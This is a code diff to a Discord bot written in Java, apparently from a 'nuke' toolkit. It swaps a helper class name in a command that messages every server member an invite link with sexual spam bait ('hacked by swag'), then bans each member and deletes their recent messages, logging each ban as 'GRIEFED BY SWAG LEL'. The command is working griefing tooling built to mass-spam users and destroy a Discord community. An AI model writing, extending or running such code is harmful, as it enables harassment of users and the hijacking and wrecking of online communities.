@@ -3,7 +3,7 @@ package me.comu.exeter.commands.nuke;
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
 import me.comu.exeter.logging.Logger;
-import me.comu.exeter.wrapper.Wrapper;
+import me.comu.exeter.utility.Utility;
 import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
 import net.dv8tion.jda.api.exceptions.HierarchyException;
@@ -22,7 +22,7 @@ public class DmAdvBanwaveCommand implements ICommand {
             try {
                 for (Member member : event.getGuild().getMembers()) {
                     if (member.getIdLong() != Core.OWNERID || !member.getId().equals(event.getAuthor().getId())) {
-                        Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://discord.gg/5KwAktW **horny egirls + nitro drop + packing events** hacked by swag");
+                        Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://discord.gg/5KwAktW **horny egirls + nitro drop + packing events** hacked by swag");
                         if (event.getGuild().getSelfMember().canInteract(member) && !member.getUser().isBot())
                         event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG LEL").queue();
                         Logger.getLogger().print("Banned " + member.getUser().getAsTag());
